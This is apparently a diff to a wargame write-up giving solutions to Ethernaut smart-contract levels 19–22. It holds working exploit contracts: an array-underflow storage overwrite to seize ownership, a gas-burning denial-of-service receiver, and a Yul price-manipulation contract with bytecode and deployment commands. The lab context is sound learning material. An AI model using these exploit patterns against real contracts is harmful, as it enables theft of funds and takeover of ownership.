@@ -509,3 +509,196 @@ await contract.setSolver('0x...')
 ```
 
 </details> 
+
+
+<details>
+    <summary>👽 Level 19 - Alien codex</summary>
+
+Relevant [Solidity docs](https://docs.soliditylang.org/en/v0.8.5/internals/layout_in_storage.html#mappings-and-dynamic-arrays):
+
+>>> "Assume the storage location of the mapping or array ends up being a slot p after applying the storage layout rules. ... Array data is located starting at keccak256(p) and it is laid out in the same way as statically-sized array data would: One element after the other, potentially sharing storage slots if the elements are not longer than 16 bytes."
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity >=0.7.0 <0.9.0;
+
+interface AlienCodex {
+  function make_contact() external;
+  function record(bytes32 _content) external;
+  function retract() external;
+  function revise(uint i, bytes32 _content) external;
+}
+
+contract Underhanded {
+    AlienCodex instance = AlienCodex(address(0x...));
+    event ErrorLog(string reason);
+
+    function pullTheTrigger() public {
+        instance.make_contact();
+        
+        // we need to underflow the length of the array, which is now 0xffffffff....
+        instance.retract();
+        
+        // now we get to modify any storage we want
+        // the base storage of the array is at 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
+        // so to overwrite storage at slot 0, we calculate the index as hex(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1)
+        instance.revise(
+            0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a,
+            0x0000000000000000000000008830c393b2ed864Bb3c1A2FB9Fce8dA83f6db66c
+        );
+    }
+    
+    function drain() public {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+
+```
+
+</details> 
+
+<details>
+    <summary>🙅‍♂️ Level 20 - Daniel</summary>
+Just burn all the gas available in the receive() function since they didn't specify a gas stipend like `call.gas(100000).value()`
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity >=0.7.0 <0.9.0;
+
+contract Burner {
+    event ErrorLog(string reason);
+
+    receive() payable external {
+        uint i = 0;
+        while (gasleft() > 10) {
+            i++;
+        }
+    }
+    
+    function drain() public {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+```
+
+</details> 
+
+<details>
+    <summary>🛍️ Level 21 - Shop</summary>
+Idea: use the fact the Shop sets `sold = true` between the two calls: they paid for a storage change, and maybe we can look it up for cheap. However even with the following Solidity code I wasn't able to get it to run under the 3000 gas limit:
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity >=0.7.0 <0.9.0;
+
+interface Shop {
+  function isSold() external view returns(bool);
+  function buy() external;
+}
+
+contract Buyer {
+    Shop shop = Shop(address(0x...));
+
+    function price() external view returns (uint) {
+        return shop.isSold{gas: 2000}() ? 42 : 200;
+    }
+    
+    function pullTheTrigger() public {
+        shop.buy();
+    }
+}
+```
+
+It ended up working with the following Yul code:
+
+```yul
+object "Buyer" {
+    code {
+        // Deploy the contract
+        datacopy(0, dataoffset("runtime"), datasize("runtime"))
+        return(0, datasize("runtime"))
+    }
+
+    object "runtime" {
+        code {
+            // Dispatcher
+            switch selector()
+
+            case 0xa035b1fe /* "price()" */ {
+                let price := 42
+                if eq(isSold(), 0) {
+                    price := 200
+                }
+                returnUint(price)
+            }
+
+            case 0xb760d418 /* "pullTheTrigger(address)" */ {
+                buy()
+                stop()
+            }
+
+            default {
+                revert(0, 0)
+            }
+
+            /* ---------- calldata decoding functions ----------- */
+            function selector() -> s {
+                s := div(calldataload(0), 0x100000000000000000000000000000000000000000000000000000000)
+            }
+
+            /* ---------- calldata encoding functions ---------- */
+            function returnUint(v) {
+                mstore(0, v)
+                return(0, 0x20)
+            }
+
+            /* ---------- utility functions ---------- */
+            function isSold() -> sold {
+                mstore(0, 0xe852e741) /* 'isSold()' */
+                let succeeded := call(gas(), 0x4cb5aee9C212ae36C415A990a8913e2b29fc312C, 0, 28, 4, 0x20, 0x20)
+                sold := mload(0x20)
+            }
+
+            function buy() {
+                mstore(0, 0xa6f2ae3a) /* 'buy()' */
+                let succeeded := call(gas(), 0x4cb5aee9C212ae36C415A990a8913e2b29fc312C, 0, 28, 4, 0, 0)
+            }
+        }
+    }
+}
+```
+
+Compile it:
+
+```
+> solc --strict-assembly --optimize Buyer.yul
+```
+
+Note the binary representation, deploy it:
+
+```javascript
+web3.eth.sendTransaction({from: player, data: '608f8061000f600039806000f350fe6000803560e01c63a035b1fe811460215763b760d41881146064578182fd608c565b602a63e852e7418352602060206004601c86734cb5aee9c212ae36c415a990a8913e2b29fc312c5af150602051151560585760c890505b80835250602082f3608c565b63a6f2ae3a825281826004601c85734cb5aee9c212ae36c415a990a8913e2b29fc312c5af150005b5050'})
+
+// make sure the contract is fresh:
+await contract.isSold()
+-> false
+
+// trigger the attack!
+web3.eth.sendTransaction({from: player, to: '0x...', data: 'b760d418', gas: 100000})
+
+await contract.isSold()
+-> true
+
+(await contract.price()).toString()
+-> 42 
+```
+
+</details> 
+
+<details>
+    <summary>⚖️ Level 22 - Dex</summary>
+
+Really anticlimactic final challenge, just keep swapping back and forth. The contract doesn't calculate the number of outgoing tokens properly, so it's losing liquidity every time 🤷‍♂️
+</details> 
